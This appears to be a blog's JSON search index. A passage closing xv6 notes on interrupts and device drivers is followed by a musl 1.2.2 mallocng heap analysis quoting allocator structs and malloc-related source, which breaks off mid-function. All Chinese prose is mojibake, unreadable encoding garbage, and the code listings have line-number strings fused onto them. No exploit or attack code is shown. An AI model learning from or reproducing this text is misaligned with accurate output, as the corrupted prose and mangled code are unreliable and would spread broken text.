è°ƒç”¨ä¹Ÿä¼šå¯¼è‡´è¿™ç±»åˆ‡æ¢ å®šæ—¶å™¨ä¸­æ–­æ¥è‡ª RISC-V ä¸­æ¯ä¸ª CPU çš„æ—¶é’Ÿç¡¬ä»¶ï¼Œxv6 å¯¹è¿™ä¸ªæ—¶é’Ÿç¡¬ä»¶ç¼–ç¨‹ï¼Œä»¥å®šæœŸä¸­æ–­æ¯ä¸ª CPU RISC-V è¦æ±‚è®¡æ—¶å™¨ä¸­æ–­è¦ç”±æœºå™¨æ¨¡å¼æ¥ç®¡ï¼Œè€Œä¸æ˜¯ç®¡ç†è€…æ¨¡å¼ RISC-V æœºå™¨æ¨¡å¼ä¸ç”¨åˆ†é¡µæ‰§è¡Œä»£ç ï¼Œä½¿ç”¨ä¸€ç»„ç‹¬ç«‹çš„æ§åˆ¶å¯„å­˜å™¨ï¼Œå› æ­¤åœ¨æœºå™¨æ¨¡å¼æ‰§è¡Œæ™®é€šçš„ xv6 å†…æ ¸ä»£ç æ—¶æ˜¯ä¸å®é™…çš„ å› æ­¤ xv6 å°†å®šæ—¶å™¨ä¸­æ–­ç‹¬ç«‹äºä¹‹å‰ä½¿ç”¨çš„ trap æœºåˆ¶è¿›è¡Œå¤„ç† æœºå™¨æ¨¡å¼æ‰§è¡Œçš„ä»£ç åœ¨ kernel/start.c ä¸­ï¼Œåœ¨æ‰§è¡Œ main ä¹‹å‰ï¼Œè®¾ç½®å®šæ—¶å™¨ä¸­æ–­çš„æ¥æ”¶ å¯¹ CLINTï¼ˆcore-local interruptorï¼‰ç¡¬ä»¶è¿›è¡Œç¼–ç¨‹ï¼Œä»¥åœ¨ä¸€å®šå»¶è¿Ÿåç”Ÿæˆä¸­æ–­ è®¾ç«‹ä¸€ä¸ªç±»ä¼¼ trapframe çš„ä¸´æ—¶åŒºåŸŸï¼Œå¸®åŠ©å®šæ—¶å™¨ä¸­æ–­å¤„ç†ç¨‹åºä¿å­˜å¯„å­˜å™¨å’Œ CLINT å¯„å­˜å™¨çš„åœ°å€ æœ€å start å°† mtvec è®¾ç½®ä¸º timervecï¼ˆåœ¨ kernel/kernelvec.S ä¸­ï¼‰ï¼Œå¯ç”¨å®šæ—¶å™¨ä¸­æ–­ çœŸå®ä¸–ç•Œxv6 å…è®¸åœ¨æ‰§è¡Œå†…æ ¸å’Œç”¨æˆ·ç¨‹åºæ—¶å¯ç”¨è®¾å¤‡å’Œå®šæ—¶å™¨ä¸­æ–­ å®šæ—¶å™¨ä¸­æ–­å¼ºåˆ¶çº¿ç¨‹åˆ‡æ¢ï¼Œå³ä½¿æ˜¯åœ¨å†…æ ¸æ€è¿è¡Œï¼Œå› æ­¤å†…æ ¸ä»£ç éœ€è¦æ³¨æ„å®ƒå¯èƒ½è¢«æŒ‚èµ·ï¼Œå¹¶åœ¨ä¸åŒçš„ CPU ä¸Šæ¢å¤ å¦‚æœå†…æ ¸çº¿ç¨‹æœ‰æ—¶èŠ±è´¹å¤§é‡æ—¶é—´è®¡ç®—è€Œä¸è¿”å›ç”¨æˆ·ç©ºé—´ï¼Œåœ¨å†…æ ¸çº¿ç¨‹ä¹‹é—´å…¬å¹³åœ°å¯¹ CPU è¿›è¡Œæ—¶é—´åˆ‡ç‰‡æ˜¯æœ‰æ•ˆçš„ å¦‚æœåªåœ¨æ‰§è¡Œç”¨æˆ·ä»£ç æ—¶å‘ç”Ÿè®¾å¤‡å’Œå®šæ—¶å™¨ä¸­æ–­ï¼Œä¼šè®©å†…æ ¸æ›´ç®€å• åœ¨ä¸€å°è®¡ç®—æœºä¸Šæ”¯æŒæ‰€æœ‰è®¾å¤‡æ˜¯ä¸€é¡¹è‰°å·¨çš„å·¥ä½œï¼Œå› ä¸ºæœ‰è®¸å¤šè®¾å¤‡ï¼Œæœ‰è®¸å¤šåŠŸèƒ½ï¼Œè®¾å¤‡å’Œ driver ä¹‹é—´çš„åè®®å¯èƒ½å¾ˆå¤æ‚ä¸”ç¼ºä¹æ–‡æ¡£ã€‚åœ¨è®¸å¤šæ“ä½œç³»ç»Ÿä¸­ï¼Œdriver æ¯”å†…æ ¸æ ¸å¿ƒä»£ç å ç”¨æ›´å¤š UART driver é€šè¿‡è¯»å– UART æ§åˆ¶å¯„å­˜å™¨ä¸€æ¬¡æ£€ç´¢ 1 Byte çš„æ•°æ®ï¼Œç§°ä¸º programmed I/Oï¼Œå› ä¸ºè½¯ä»¶æ­£åœ¨é©±åŠ¨æ•°æ®ç§»åŠ¨ DMA ç¼–ç¨‹ I/O å¾ˆç®€å•ï¼Œä½†æ˜¯é€Ÿåº¦å¤ªæ…¢ï¼Œæ— æ³•åœ¨é«˜æ•°æ®é€Ÿç‡ä¸‹ä½¿ç”¨ xv6 çš„ UART driver å…ˆå°†ä¼ å…¥çš„æ•°æ®å¤åˆ¶åˆ°å†…æ ¸çš„ç¼“å†²åŒºï¼Œå†å¤åˆ¶åˆ°ç”¨æˆ·ç©ºé—´ï¼Œåœ¨ä½æ•°æ®é€Ÿç‡æ—¶æœ‰æ•ˆï¼Œä½†å¦‚æœè®¾å¤‡äº§ç”Ÿæˆ–ä½¿ç”¨æ•°æ®å¾ˆå¿«ï¼Œä¸¤æ¬¡å¤åˆ¶ä¼šä¸¥é‡é™ä½æ€§èƒ½ å› æ­¤æœ‰ç›´æ¥å­˜å‚¨å™¨è®¿é—®ï¼ˆDMAï¼‰æŠ€æœ¯ DMA ç¡¬ä»¶è®¾å¤‡ç›´æ¥å°†ä¼ å…¥çš„æ•°æ®å†™å…¥ RAMï¼Œå¹¶ä» RAM è¯»å–ä¼ å‡ºçš„æ•°æ® é«˜é€Ÿç§»åŠ¨å¤§é‡æ•°æ®çš„è®¾å¤‡ï¼ˆç°ä»£ç£ç›˜å’Œç½‘ç»œè®¾å¤‡ï¼‰é€šå¸¸ä½¿ç”¨ç›´æ¥å­˜å‚¨å™¨è®¿é—®ï¼ˆDMAï¼‰ ä¸€äº›æ“ä½œç³»ç»Ÿå¸¸ä½¿ç”¨ DMA ç›´æ¥å°†æ•°æ®åœ¨ç”¨æˆ·ç©ºé—´çš„ç¼“å†²åŒºå’Œè®¾å¤‡ç¡¬ä»¶ä¹‹é—´ç§»åŠ¨ DMA è®¾å¤‡ driver åœ¨ RAM ä¸­å‡†å¤‡æ•°æ®ï¼Œå¯¹ä¸€ä¸ªæ§åˆ¶å¯„å­˜å™¨è¿›è¡Œä¸€æ¬¡å†™å…¥å‘Šè¯‰è®¾å¤‡å»å¤„ç†å‡†å¤‡å¥½çš„æ•°æ® ä¸­æ–­ä¼˜åŒ–å½“ä¸€ä¸ªè®¾å¤‡åœ¨ä¸å¯é¢„æµ‹çš„æ—¶é—´éœ€è¦å…³æ³¨æ—¶ï¼Œä¸­æ–­æ˜¯æœ‰æ„ä¹‰çš„ï¼Œä½†æ˜¯ä¸­æ–­æœ‰å¾ˆé«˜çš„ CPU å¼€é”€ é«˜é€Ÿè®¾å¤‡ï¼ˆå¦‚ç½‘ç»œå’Œç£ç›˜æ§åˆ¶å™¨ï¼‰ä½¿ç”¨ä¸€äº›æŠ€å·§å‡å°‘ä¸­æ–­çš„éœ€æ±‚ å¯¹æ•´æ‰¹ä¼ å…¥æˆ–ä¼ å‡ºçš„è¯·æ±‚å‘èµ·ä¸€ä¸ªä¸­æ–­ è½®è¯¢ï¼šå®Œå…¨ç¦ç”¨ä¸­æ–­ï¼Œå®šæœŸæ£€æŸ¥è®¾å¤‡æ˜¯å¦éœ€è¦å…³æ³¨ å¦‚æœè®¾å¤‡æ‰§è¡Œæ“ä½œéå¸¸å¿«ï¼Œè½®è¯¢æ•ˆç‡è¾ƒé«˜ï¼Œä½†æ˜¯å¦‚æœè®¾å¤‡å¤§éƒ¨åˆ†æ—¶é—´å¤„äºç©ºé—²çŠ¶æ€ï¼Œåˆ™ä¼šæµªè´¹ CPU æ—¶é—´ æŸäº›é©±åŠ¨ç¨‹åºæ ¹æ®å½“å‰è®¾å¤‡è´Ÿè½½ä¼šåœ¨è½®è¯¢å’Œä¸­æ–­ä¹‹é—´åŠ¨æ€åˆ‡æ¢ è®¾å¤‡ä½¿ç”¨å¦‚ç¬¬ 1 ç« æ‰€è¿°ï¼Œæ§åˆ¶å°åœ¨åº”ç”¨ç¨‹åºå‘ˆç°ä¸ºä¸€ä¸ªå¸¸è§„æ–‡ä»¶ï¼Œåº”ç”¨ç¨‹åºé€šè¿‡ read å’Œ write ç³»ç»Ÿè°ƒç”¨è¯»å–è¾“å…¥ï¼Œå†™å…¥è¾“å‡º åº”ç”¨ç¨‹åºå¯èƒ½æƒ³è¦æ§åˆ¶ä¸èƒ½ä½œä¸ºæ ‡å‡†æ–‡ä»¶ç³»ç»Ÿè°ƒç”¨çš„è®¾å¤‡ï¼ŒUnix æ“ä½œç³»ç»Ÿæ”¯æŒ ioctl ç³»ç»Ÿè°ƒç”¨åº”å¯¹è¿™ç§æƒ…å†µ å®æ—¶å“åº”è®¡ç®—æœºçš„ä¸€äº›ä½¿ç”¨éœ€è¦ç³»ç»Ÿåœ¨æœ‰é™çš„æ—¶é—´å†…åšå‡ºå“åº”ï¼ˆä¸¥æ ¼å®‰å…¨çš„ç³»ç»Ÿé”™è¿‡ deadline å¯èƒ½ä¼šå¯¼è‡´ç¾éš¾ï¼‰ xv6 ä¸é€‚åˆä¸¥æ ¼å®æ—¶è®¾ç½®ï¼Œä¸¥æ ¼å®æ—¶æ“ä½œç³»ç»Ÿå¾€å¾€æ˜¯ä¸åº”ç”¨ç¨‹åºé“¾æ¥çš„åº“ï¼Œå…è®¸è¿›è¡Œåˆ†ææœ€åæƒ…å†µä¸‹çš„å“åº”æ—¶é—´ xv6 ä¹Ÿä¸é€‚åˆè½¯å®æ—¶åº”ç”¨ç¨‹åºï¼Œå¶å°”é”™è¿‡ deadline æ˜¯å¯ä»¥æ¥å—çš„ï¼Œå› ä¸º xv6 è°ƒç”¨ç¨‹åºè¿‡äºç®€å•ï¼Œå¹¶ä¸”å®ƒåœ¨å†…æ ¸ä»£ç è·¯å¾„ä¸­æœ‰ä¸€æ®µè¾ƒé•¿æ—¶é—´ä¸­æ–­æ˜¯ç¦æ­¢çš„","link":"/2022/10/14/Xv6/"},{"title":"Musl heap æµ…æ","text":"æµ…æµ…åˆ†æä¸€ä¸‹ å‰è¨€ç¯å¢ƒï¼šx64 musl-1.2.2 ç¬”è€…åªæµ…æµ…åˆ†æäº† malloc å’Œ free çš„æºç ï¼Œå¯¹ç›¸å…³ç»“æ„æ²¡æœ‰è¯¦ç»†ä»‹ç»ï¼Œå¯é…åˆ xf1les å¸ˆå‚…çš„æ–‡ç« é£Ÿç”¨ ç›¸å…³ç»“æ„chunkå®é™…ä¸Šæºç å¹¶æ²¡æœ‰ chunk ç»“æ„ä½“å®šä¹‰ï¼Œä¸‹é¢æ˜¯é€šè¿‡ malloc æ¨æµ‹å‡ºæ¥ 1234567struct chunk { char prev_data[4]; uint8_t idx:5; // group çš„ç¬¬å‡ ä¸ª chunkï¼Œä» 0 å¼€å§‹ uint8_t reserved:3; // chunk æ²¡æœ‰ç”¨åˆ°çš„ç©ºé—´å¤§å°ï¼Œè‹¥ reserved = 5ï¼Œé‚£ä¹ˆä¼šåœ¨ä¸‹ä¸€ä¸ª chunk çš„ prev_data ä¸­è®°å½•çœŸå®çš„ reserved uint16_t offset; // ç›¸å¯¹äºç¬¬ä¸€ä¸ª chunk çš„åç§»ï¼Œå®é™…åœ°å€åç§»ä¸º offset * 0x10 char data[]; // ç”¨æˆ·æ•°æ®}; prev_data ç©ºé—´å¤ç”¨ï¼Œå‰ä¸€ä¸ª chunk å¯ä»¥å¤šä½¿ç”¨ 4 ä¸ªå­—èŠ‚ idx group çš„ç¬¬å‡ ä¸ª chunkï¼Œä» 0 å¼€å§‹ reserved chunk æ²¡æœ‰ç”¨åˆ°çš„ç©ºé—´å¤§å° è‹¥ reserved == 5ï¼Œé‚£ä¹ˆä¼šåœ¨ä¸‹ä¸€ä¸ª chunk çš„ prev_data ä¸­è®°å½•çœŸå®çš„ reserved offset ç›¸å¯¹äºç¬¬ä¸€ä¸ª chunk çš„åç§»ï¼Œå®é™…åœ°å€åç§»ä¸º offset * 0x10 ç”±äºå†…å­˜å¯¹é½ï¼Œæ¯ä¸ª chunk å¯ä»¥ä½¿ç”¨ä¸‹ä¸€ä¸ª chunk çš„ 4 å­—èŠ‚ç©ºé—´ ï¼ˆæ¯ä¸ª group çš„ç¬¬ä¸€ä¸ª chunk å‰é¢æœ‰ 0x10 ä¸ªå­—èŠ‚ = group + chunk_headerï¼‰ inuse_chunkavail_mask å’Œ freed_mask å¯¹åº”çš„ä½ç½®éƒ½ä¸º 0 unuse_chunk avail_chunk å†…å®¹ä¸€èˆ¬ä¸ºç©º avail_mask ä¸Š idx å¯¹åº”çš„ä½ç½®ä¸º 1 freed_chunk idx å’Œ reserved ç½®ä¸º 0xffï¼Œoffset ç½®é›¶ freed_mask ä¸Š idx å¯¹åº”çš„ä½ç½®ä¸º 1 group./src/malloc/mallocng/meta.h1234567#define UNIT 16struct group { struct meta *meta; // å¯¹åº”çš„ meta åœ°å€ unsigned char active_idx:5; // last_chunk_idx char pad[UNIT - sizeof(struct meta *) - 1]; // alien unsigned char storage[]; // chunks}; ç”± meta ç®¡ç†ï¼Œä½äºå¯æ‰§è¡Œæ–‡ä»¶çš„æ•°æ®æ®µ meta å¯¹åº”çš„ meta åœ°å€ active_idx å¯ç”¨çš„ chunk çš„æœ€å¤§ idx pad å¡«å……ä½ï¼Œç”¨äºå¯¹é½ storage å­˜å‚¨æ•°æ®ï¼Œchunks meta./src/malloc/mallocng/meta.h123456789struct meta { struct meta *prev, *next; // åŒç±»å‹ä¸”å¯åˆ†é… chunk çš„ meta æˆ– freed_meta ä»¥åŒå‘é“¾è¡¨çš„å½¢å¼è¿æ¥ struct group *mem; // æŒ‡å‘å¯¹åº”çš„ group åœ°å€ volatile int avail_mask, freed_mask; // ä»¥ä½å›¾æ–¹å¼è¡¨ç¤º group ä¸­ chunk çŠ¶æ€ uintptr_t last_idx:5; // group ä¸­ chunk æ•°é‡ uintptr_t freeable:1; // meta æ˜¯å¦å¯ä»¥è¢«å›æ”¶ï¼Œ1 è¡¨ç¤ºå¯ä»¥ uintptr_t sizeclass:6; // ä½œä¸º size_classes çš„ä¸‹æ ‡ï¼Œä¸ºè¯¥ group ä¸­æ¯ä¸ª chunk å¤§å°ï¼ˆByteï¼‰ uintptr_t maplen:8*sizeof(uintptr_t)-12;}; prevï¼Œnext åŒç±»å‹ä¸”å¯åˆ†é… chunk çš„ meta æˆ– freed_meta ä»¥åŒå‘é“¾è¡¨çš„å½¢å¼è¿æ¥ mem æŒ‡å‘å¯¹åº”çš„ group åœ°å€ avail_maskï¼Œfreed_mask ä»¥ä½å›¾æ–¹å¼è¡¨ç¤º group ä¸­ chunk çŠ¶æ€ï¼Œå› æ­¤ä¸€ä¸ª group æœ€å¤šèƒ½æœ‰ 32 ä¸ª chunk 0 è¡¨ç¤º inuseï¼Œ1 è¡¨ç¤º avail æˆ– freed chunk åˆ†ä¸º inuse_chunkã€avail_chunkã€freed_chunk ä¸‰ä¸ªçŠ¶æ€ last_idx group ä¸­ chunk æ•°é‡ freeable meta æ˜¯å¦å¯ä»¥è¢«å›æ”¶ï¼Œ1 è¡¨ç¤ºå¯ä»¥ sizeclass ä½œä¸º size_classes çš„ä¸‹æ ‡ï¼Œä¸ºè¯¥ group ä¸­æ¯ä¸ª chunk å¤§å°ï¼ˆByteï¼‰ 123456789101112131415// ./src/malloc/mallocng/malloc.cconst uint16_t size_classes[] = { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 15, 18, 20, 25, 31, 36, 42, 50, 63, 72, 84, 102, 127, 146, 170, 204, 255, 292, 340, 409, 511, 584, 682, 818, 1023, 1169, 1364, 1637, 2047, 2340, 2730, 3276, 4095, 4680, 5460, 6552, 8191,}; maplen è‹¥ group æ˜¯ mmap åˆ†é…çš„ç©ºé—´ï¼Œä¸ºå¯¹åº”çš„é•¿åº¦ï¼Œå…¶ä»–æƒ…å†µä¸º 0 avail_metaåœ¨ meta_area ä¸­æŒ‰é¡ºåºå–å‡ºï¼Œavail_meta = {0} freed_meta FIFOï¼Œmalloc_context ä¸­ freed_meta_head æŒ‡å‘ç¬¬ä¸€ä¸ª freed_meta meta-&gt;mem-&gt;meta = 0 freed_meta = {0} meta_area./src/malloc/mallocng/meta.h123456struct meta_area { uint64_t check; // ä¸ malloc_context ä¸­çš„ secret ç›¸ç­‰ï¼Œé˜²æ­¢ä¼ªé€  meta struct meta_area *next; // ä¸‹ä¸€ä¸ª meta_area çš„åœ°å€ int nslots; // meta æ§½çš„æ•°é‡ struct meta slots[]; // metas}; ä»¥é¡µä¸ºå•ä½åˆ†é…ï¼Œæ˜¯å¤šä¸ª meta çš„é›†åˆï¼Œå› æ­¤ meta_area_addr = meta_addr &amp; 0xfffffffffffff000 check ä¸ malloc_context ä¸­çš„ secret ç›¸ç­‰ï¼Œé˜²æ­¢ä¼ªé€  meta next ä¸‹ä¸€ä¸ª meta_area çš„åœ°å€ nslots meta æ§½çš„æ•°é‡ æ³¨ï¼šåœ¨ musl ä¸­ slot å¯èƒ½æŒ‡ meta ä¹Ÿå¯èƒ½æŒ‡ chunk slots å­˜æ”¾å¤šä¸ª meta ç»“æ„ä½“ï¼Œmetas malloc_context./src/malloc/mallocng/meta.h123456789101112131415161718struct malloc_context { uint64_t secret; // é˜²æ­¢ä¼ªé€  meta#ifndef PAGESIZE size_t pagesize;#endif int init_done; // æ˜¯å¦åˆå§‹åŒ–çš„æ ‡è®° unsigned mmap_counter; // è®°å½• mmap å‡ºæ¥çš„ chunk çš„æ•°é‡ struct meta *free_meta_head; // æŒ‡å‘ freed_meta å¤´ struct meta *avail_meta; // æŒ‡å‘ area_areas ä¸­å¯åˆ†é… meta ç©ºé—´ size_t avail_meta_count, avail_meta_area_count, meta_alloc_shift; struct meta_area *meta_area_head, *meta_area_tail; // åˆ†åˆ«æŒ‡å‘ç¬¬ä¸€ä¸ªå’Œæœ€åä¸€ä¸ª meta_area unsigned char *avail_meta_areas; struct meta *active[48]; // å¯ä»¥åˆ†é…çš„ meta åœ°å€ï¼Œidx å¯¹åº”ç€ size_classes çš„å¤§å°ï¼Œç±»ä¼¼ glibc çš„ bins size_t usage_by_class[48]; // idx å¯¹åº”å¤§å°çš„æ‰€æœ‰ meta çš„ chunk æ•°é‡ uint8_t unmap_seq[32], bounces[32]; uint8_t seq; uintptr_t brk; // è®°å½•ç›®å‰çš„ brk(0)}; ä½äº libc çš„æ•°æ®æ®µï¼Œä¸ºå…¨å±€ç»“æ„ä½“ secret é˜²æ­¢ä¼ªé€  meta free_meta_head æŒ‡å‘ freed_meta å¤´ avail_meta æŒ‡å‘å¯ç”¨ meta æ•°ç»„ active æŒ‡å‘ä¸€ä¸ª meta åŒå‘é“¾è¡¨ï¼Œå…¶ä¸­çš„ meta ä¸€èˆ¬éƒ½æœ‰ unuse_chunk idx å¯¹åº”ç€ size_classes çš„å¤§å°ï¼Œç±»ä¼¼ glibc çš„ bins æŒ‡å‘çš„ç¬¬ä¸€ä¸ª meta ä¸€èˆ¬æœ‰ avail_chunkï¼Œåé¢çš„ meta ä¸€èˆ¬åªæœ‰ freed_chunk usage_by_class idx å¯¹åº”å¤§å°çš„æ‰€æœ‰ meta çš„ group ç®¡ç†çš„ chunk æ•°é‡ brk è®°å½•ç›®å‰çš„ brk(0) chunk -&gt; meta./src/malloc/mallocng/meta.h1234567891011121314151617181920212223242526272829303132static inline struct meta *get_meta(const unsigned char *p){ assert(!((uintptr_t)p &amp; 15)); int offset = *(const uint16_t *)(p - 2); int index = get_slot_index(p); if (p[-4]) { assert(!offset); offset = *(uint32_t *)(p - 8); assert(offset &gt; 0xffff); } const struct group *base = (const void *)(p - UNIT*offset - UNIT); const struct meta *meta = base-&gt;meta; /* check */ assert(meta-&gt;mem == base); assert(index &lt;= meta-&gt;last_idx); assert(!(meta-&gt;avail_mask &amp; (1u&lt;&lt;index))); assert(!(meta-&gt;freed_mask &amp; (1u&lt;&lt;index))); const struct meta_area *area = (void *)((uintptr_t)meta &amp; -4096); assert(area-&gt;check == ctx.secret); if (meta-&gt;sizeclass &lt; 48) { assert(offset &gt;= size_classes[meta-&gt;sizeclass]*index); assert(offset &lt; size_classes[meta-&gt;sizeclass]*(index+1)); } else { assert(meta-&gt;sizeclass == 63); } if (meta-&gt;maplen) { assert(offset &lt;= meta-&gt;maplen*4096UL/UNIT - 1); }/* end */ return (struct meta *)meta;} å– chunk çš„ idx å’Œ offset é€šè¿‡ offset å– group é€šè¿‡ group-&gt;meta å– meta å„ç§æ£€æŸ¥ meta-&gt;mem == group idx &lt;= meta-&gt;last_idx meta çš„ mask ä¸Š idx å¯¹åº”çš„ä½ç½®æ˜¯å¦éƒ½ä¸º 0 meta_area-&gt;check == malloc_context.secret size_classes[meta-&gt;sizeclass]*(index) &lt;= offset &lt; size_classes[meta-&gt;sizeclass]*(index+1) å¤§æ¦‚æ€»ç»“ä¸€ä¸‹ malloc_context ä½œä¸ºå…¨å±€å˜é‡ï¼Œåœ¨ libc æ•°æ®æ®µ meta_area ä½œä¸º meta çš„é›†åˆï¼Œç®¡ç†ç€ meta åŒç±»å‹ ä¸” æœ‰å¯åˆ†é… chunk çš„ meta ä»¥åŒå‘é“¾è¡¨å½¢å¼è¿æ¥èµ·æ¥ï¼Œå¦‚æœ meta çš„ chunk å…¨éƒ¨åˆ†é…å‡ºå»ï¼Œåˆ™ä¼šä»åŒå‘é“¾è¡¨ä¸­ç§»å‡º malloc æ—¶ï¼Œé€šè¿‡ malloc_context çš„ active å¯»æ‰¾å¯¹åº”å¤§å°çš„å¯ä½¿ç”¨çš„ metaï¼Œç±»ä¼¼ glibc çš„ bins malloc_context çš„ active æŒ‡å‘çš„ç¬¬ä¸€ä¸ª meta ä¸€èˆ¬æ˜¯æœ‰ avail_chunk æˆ–è€… freed_chunkï¼ˆæˆ–æ‰€æœ‰ chunk åˆšå¥½åˆ†é…å®Œï¼‰ï¼Œæ­¤ meta åé¢çš„ meta ä¸€èˆ¬åªæœ‰ freed_chunk malloc_context çš„ freed_meta_head æŒ‡å‘ freed_meta é“¾è¡¨ mallocmalloc./src/malloc/mallocng/malloc.c123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108void *malloc(size_t n){ if (size_overflows(n)) return 0; struct meta *g; uint32_t mask, first; // sizeclass int sc; int idx; int ctr; // mmap åˆ†é… // #define MMAP_THRESHOLD 131052 if (n &gt;= MMAP_THRESHOLD) { size_t needed = n + IB + UNIT; void *p = mmap(0, needed, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0); if (p==MAP_FAILED) return 0; wrlock(); step_seq(); g = alloc_meta(); if (!g) { unlock(); munmap(p, needed); return 0; } g-&gt;mem = p; g-&gt;mem-&gt;meta = g; g-&gt;last_idx = 0; g-&gt;freeable = 1; g-&gt;sizeclass = 63; g-&gt;maplen = (needed+4095)/4096; g-&gt;avail_mask = g-&gt;freed_mask = 0; // use a global counter to cycle offset in // individually-mmapped allocations. ctx.mmap_counter++; idx = 0; goto success; } // æ ¹æ® n å– size_classes å¯¹åº”å¤§å°çš„ä¸‹æ ‡ sc = size_to_class(n); rdlock(); /* å¯»æ‰¾åˆé€‚çš„ meta */ // è·å–å¯¹åº”å¤§å°çš„ meta g = ctx.active[sc]; // use coarse size classes initially when there are not yet // any groups of desired size. this allows counts of 2 or 3 // to be allocated at first rather than having to start with // 7 or 5, the min counts for even size classes. // å¦‚æœæ²¡æœ‰å¯¹åº”çš„ metaï¼Œä¸” 4 &lt;= sc &lt; 32 ä¸” sc !=6 ä¸” sc ä¸ºå¶æ•° ä¸”å¯¹åº”å¤§å°çš„æ‰€æœ‰ chunk æ•°é‡ä¸º 0 if (!g &amp;&amp; sc&gt;=4 &amp;&amp; sc&lt;32 &amp;&amp; sc!=6 &amp;&amp; !(sc&amp;1) &amp;&amp; !ctx.usage_by_class[sc]) { // ä½¿ç”¨æ›´å¤§ä¸€ç‚¹ï¼ˆsc+1ï¼‰çš„ meta size_t usage = ctx.usage_by_class[sc|1]; // if a new group may be allocated, count it toward // usage in deciding if we can use coarse class. // å¦‚æœ sc+1 å¯¹åº”çš„ meta ä¹Ÿä¸å­˜åœ¨æˆ–å­˜åœ¨ä½†æ²¡æœ‰å¯ç”¨çš„ chunk åˆ™ usage+3 if (!ctx.active[sc|1] || (!ctx.active[sc|1]-&gt;avail_mask &amp;&amp; !ctx.active[sc|1]-&gt;freed_mask)) usage += 3; // å¦‚æœ usage &lt;= 12 åˆ™ sc+1 if (usage &lt;= 12) sc |= 1; g = ctx.active[sc]; }/* end *//* å¯»æ‰¾å¯åˆ†é…çš„ chunk */ for (;;) { mask = g ? g-&gt;avail_mask : 0; // å–æœ€ä½ä½çš„ 1ï¼Œå³å–å¯ç”¨çš„ idx æœ€å°çš„ chunkï¼Œæ²¡æœ‰åˆ™ä¸º 0 first = mask&amp;-mask; // è‹¥æ— å¯ç”¨ chunkï¼Œåˆ™è·³å‡ºå¾ªç¯ if (!first) break; // è‹¥æ²¡æœ‰å…¶ä»–é—®é¢˜ï¼Œåˆ™åœ¨ avail_mask ä¸­å°†å¯¹åº” chunk çš„é‚£ä¸€ bit ä½ç½®é›¶ if (RDLOCK_IS_EXCLUSIVE || !MT) g-&gt;avail_mask = mask-first; else if (a_cas(&amp;g-&gt;avail_mask, mask, mask-first)!=mask) continue; // è®¡ç®—å‡ºå¯¹åº”çš„ chunk idx idx = a_ctz_32(first); goto success; } upgradelock(); // å¦‚æœæ²¡æœ‰åˆé€‚çš„ chunkï¼Œåˆ™è¿›ä¸€æ­¥åˆ†é…ï¼Œè·å– chunk ä¸‹æ ‡ idx = alloc_slot(sc, n); if (idx &lt; 0) { unlock(); return 0; } // æ›´æ–°ä¸ºå³å°†ä½¿ç”¨çš„ meta g = ctx.active[sc];/* end */ success: ctr = ctx.mmap_counter; unlock(); return enframe(g, idx, n, ctr);} å°† size è½¬åŒ–ä¸ºå¯¹åº”çš„ size_classes çš„ä¸‹æ ‡ sc å– ctx.active[sc] ç¬¬ä¸€ä¸ª metaï¼Œå–å…¶ avail_mask ä¸­ idx æœ€å°çš„ chunk å¦‚æœæ²¡æœ‰åˆ™è¿›å…¥ alloc_slot åšè¿›ä¸€æ­¥åˆ†é… alloc_slot./src/malloc/mallocng/malloc.c12345678910111213static int alloc_slot(int sc, size_t req){ uint32_t first = try_avail(&amp;ctx.active[sc]); if (first) return a_ctz_32(first); // å¦‚æœé“¾è¡¨ä¸­éƒ½æ²¡æœ‰å¯ç”¨çš„ chunkï¼Œåˆ™é‡æ–°ç”³è¯·ä¸€ä¸ª group struct meta *g = alloc_group(sc, req); if (!g) return -1; g-&gt;avail_mask--; queue(&amp;ctx.active[sc], g); return 0;} è¿›å…¥ try_avail å°è¯•ä» ctx.active[sc] å¯¹åº”çš„ meta é“¾è¡¨ä¸­å¯»æ‰¾å¯åˆ†é…çš„ chunk æ²¡æœ‰åˆ™è¿›å…¥ alloc_group å†ç”³è¯·ä¸€ä¸ª meta å’Œ group try_avail./src/malloc/mallocng/malloc.c123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869static uint32_t try_avail(struct meta **pm){ struct meta *m = *pm; uint32_t first; if (!m) return 0; uint32_t mask = m-&gt;avail_mask; // è‹¥æ²¡æœ‰å¯åˆ†é…çš„ chunk if (!mask) { if (!m) return 0; if (!m-&gt;freed_mask) { /* ä¸”ä¹Ÿæ²¡æœ‰ freed chunkï¼Œå³ group ä¸­çš„ chunk éƒ½æ˜¯ inuse åˆ™å°†è¯¥ meta ä» ctx.active[sc] å’Œ åŒå‘é“¾è¡¨ä¸­ç§»é™¤ */ dequeue(pm, m); m = *pm; if (!m) return 0; } else { // ä¼˜å…ˆä½¿ç”¨ä¸‹ä¸€ä¸ª meta çš„ freed_chunk m = m-&gt;next; *pm = m; } mask = m-&gt;freed_mask; // skip fully-free group unless it's the only one // or it's a permanently non-freeable group // è·³è¿‡æ‰€æœ‰ chunk éƒ½æ˜¯ freed_chunk ä¸”å¯ free çš„ metaï¼Œä¸€èˆ¬ä¸ä¼šå‡ºç°è¿™ä¸ªæƒ…å†µ if (mask == (2u&lt;&lt;m-&gt;last_idx)-1 &amp;&amp; m-&gt;freeable) { m = m-&gt;next; *pm = m; mask = m-&gt;freed_mask; } // activate more slots in a not-fully-active group // if needed, but only as a last resort. prefer using // any other group with free slots. this avoids // touching &amp; dirtying as-yet-unused pages. /* æ€»ç»“èµ·æ¥å°±æ˜¯ï¼Œå¦‚æœç¬¬ä¸€ä¸ª meta çš„ chunk éƒ½æ˜¯ inuseï¼Œ ä¸”ç¬¬äºŒä¸ª meta çš„ freed_chunk ä½¿ç”¨å®Œäº†ï¼Œæ‰è¿›å…¥ä¸‹é¢çš„æ“ä½œ å¯èƒ½æ˜¯ä»€ä¹ˆç‰¹æ®Šæƒ…å†µï¼Œæ­£å¸¸ä¸ä¼šå‡ºç°è¿™ä¸ªæƒ…å†µ*/ if (!(mask &amp; ((2u&lt;&lt;m-&gt;mem-&gt;active_idx)-1))) { if (m-&gt;next != m) { m = m-&gt;next; *pm = m; } else { int cnt = m-&gt;mem-&gt;active_idx + 2; int size = size_classes[m-&gt;sizeclass]*UNIT; int span = UNIT + size*cnt; // activate up to next 4k boundary while ((span^(span+size-1)) &lt; 4096) { cnt++; span += size; } if (cnt &gt; m-&gt;last_idx+1) cnt = m-&gt;last_idx+1; 